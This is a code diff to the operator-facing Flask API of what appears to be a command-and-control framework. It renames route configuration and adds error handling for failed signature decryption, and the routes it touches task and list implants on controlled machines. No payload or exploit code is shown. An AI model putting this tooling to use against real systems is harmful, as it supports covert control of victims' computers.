@@ -1,3 +1,6 @@
+import nacl
+import nacl.exceptions
+
 from datetime import datetime, timedelta
 from typing import Any
 from flask import Blueprint, jsonify, request
@@ -5,10 +8,10 @@ from maliketh.db import db
 from maliketh.models import *
 from maliketh.crypto.ec import *
 from maliketh.crypto.utils import random_hex, random_string
-from maliketh.config import ROUTES
+from maliketh.config import OP_ROUTES
 from functools import wraps
 
-admin = Blueprint("admin", __name__, url_prefix=ROUTES["operator"]["base_path"])
+admin = Blueprint("admin", __name__, url_prefix=OP_ROUTES["base_path"])
 start_time = datetime.now()
 
 
@@ -64,8 +67,8 @@ def verified(func):
 
 
 @admin.route(
-    ROUTES["operator"]["stats"]["path"],
-    methods=ROUTES["operator"]["stats"]["methods"],
+    OP_ROUTES["stats"]["path"],
+    methods=OP_ROUTES["stats"]["methods"],
 )
 @verified
 def server_stats(operator: Operator) -> Any:
@@ -95,8 +98,8 @@ def server_stats(operator: Operator) -> Any:
 
 # @admin.route("/op/auth/token/request", methods=["GET"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["request_auth_token"]["path"],
-    methods=ROUTES["operator"]["request_auth_token"]["methods"],
+    OP_ROUTES["request_auth_token"]["path"],
+    methods=OP_ROUTES["request_auth_token"]["methods"],
 )
 def request_token() -> Any:
     # Check if X-ID and X-Signature header is present
@@ -116,9 +119,12 @@ def request_token() -> Any:
     if operator is None:
         return jsonify({"status": False, "message": "Unknown operator"}), 400
 
-    original_message = decrypt_and_verify(
-        bytes(request.headers["X-Signature"], "utf-8"), operator
-    )
+    try:
+        original_message = decrypt_and_verify(
+            bytes(request.headers["X-Signature"], "utf-8"), operator
+        )
+    except nacl.exceptions.CryptoError:
+        return jsonify({"status": False, "msg": "Couldn't decrypt signature"}), 400
 
     if original_message is None:
         return jsonify({"status": False, "msg": "Couldn't verify signature"}), 400
@@ -173,8 +179,8 @@ def request_token() -> Any:
 
 # @admin.route("/op/auth/token/revoke", methods=["GET"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["revoke_auth_token"]["path"],
-    methods=ROUTES["operator"]["revoke_auth_token"]["methods"],
+    OP_ROUTES["revoke_auth_token"]["path"],
+    methods=OP_ROUTES["revoke_auth_token"]["methods"],
 )
 @verified
 def revoke_token(operator: Operator) -> Any:
@@ -185,8 +191,8 @@ def revoke_token(operator: Operator) -> Any:
 
 
 @admin.route(
-    ROUTES["operator"]["auth_token_status"]["path"],
-    methods=ROUTES["operator"]["auth_token_status"]["methods"],
+    OP_ROUTES["auth_token_status"]["path"],
+    methods=OP_ROUTES["auth_token_status"]["methods"],
 )
 def token_status() -> Any:
     operator = verify_auth_token(request)
@@ -197,8 +203,8 @@ def token_status() -> Any:
 
 # @admin.route("/op/tasks/list", methods=["GET"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["list_tasks"]["path"],
-    methods=ROUTES["operator"]["list_tasks"]["methods"],
+    OP_ROUTES["list_tasks"]["path"],
+    methods=OP_ROUTES["list_tasks"]["methods"],
 )
 @verified
 def list_tasks(operator: Operator) -> Any:
@@ -211,8 +217,8 @@ def list_tasks(operator: Operator) -> Any:
 
 # @admin.route("/op/tasks/add", methods=["POST"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["add_task"]["path"],
-    methods=ROUTES["operator"]["add_task"]["methods"],
+    OP_ROUTES["add_task"]["path"],
+    methods=OP_ROUTES["add_task"]["methods"],
 )
 @verified
 def add_task(operator: Operator) -> Any:
@@ -253,8 +259,8 @@ def add_task(operator: Operator) -> Any:
 
 # @admin.route("/op/tasks/result/<task_id>", methods=["GET"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["task_results"]["path"],
-    methods=ROUTES["operator"]["task_results"]["methods"],
+    OP_ROUTES["task_results"]["path"],
+    methods=OP_ROUTES["task_results"]["methods"],
 )
 @verified
 def get_task_result(operator: Operator, task_id: str) -> Any:
@@ -274,8 +280,8 @@ def get_task_result(operator: Operator, task_id: str) -> Any:
 
 # @admin.route("/op/tasks/delete/<task_id>", methods=["DELETE"])  # type: ignore
 @admin.route(
-    ROUTES["operator"]["delete_task"]["path"],
-    methods=ROUTES["operator"]["delete_task"]["methods"],
+    OP_ROUTES["delete_task"]["path"],
+    methods=OP_ROUTES["delete_task"]["methods"],
 )
 @verified
 def delete_task(operator: Operator, task_id: str) -> Any:
@@ -297,8 +303,8 @@ def delete_task(operator: Operator, task_id: str) -> Any:
 
 
 @admin.route(
-    ROUTES["operator"]["list_implants"]["path"],
-    methods=ROUTES["operator"]["list_implants"]["methods"],
+    OP_ROUTES["list_implants"]["path"],
+    methods=OP_ROUTES["list_implants"]["methods"],
 )
 @verified
 def list_implants(operator: Operator) -> Any:
